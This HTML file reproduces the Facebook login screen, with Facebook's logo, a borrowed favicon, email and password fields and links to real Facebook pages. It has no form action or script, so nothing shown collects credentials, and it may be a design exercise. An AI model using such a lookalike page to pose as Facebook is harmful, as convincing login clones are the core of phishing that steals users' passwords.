<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="fb.css">
    <link rel="icon" type="image/x-icon" href="https://binghamprospector.org/wp-content/uploads/2012/10/facebook-1024x1024.png">
</head>
<body>
    <div id="color">
        <img style="background-image:none; "src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt=""  width="240" height="85" class="center" >
        <div class="box" ><br>

            <h3 font style="font-size: 1.2rem;font-weight: 100;">Log in to Facebook</h3><br>
            <!-- username -->

                <input id="username"type="email" placeholder="Email address or phone number" style="color rgba(149, 147, 147, 0.071); border: 2px solid rgba(0, 0, 0, 0.073); padding-left: 20px; font-size: 16px; " >
                <br><br>

            <!-- password -->
               
                <input id="password" type="password" placeholder="Password" style="color: rgba(0,0,0,.5); border: 2px solid rgba(0,0,0,.1);padding-left: 20px; font-size: 16px;" ><br><br>
                
            <!-- button -->  

                <button id="button" style="font-weight: bold;">Log in</button><br><br>

            <!-- link -->
                <a class="link" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten account? </a>
                
                <a class="link"href="https://www.facebook.com/r.php?locale=en_GB&display=page"> Sign up for Facebook</a>

        </div>

     </div>
       
    
</body>
</html>
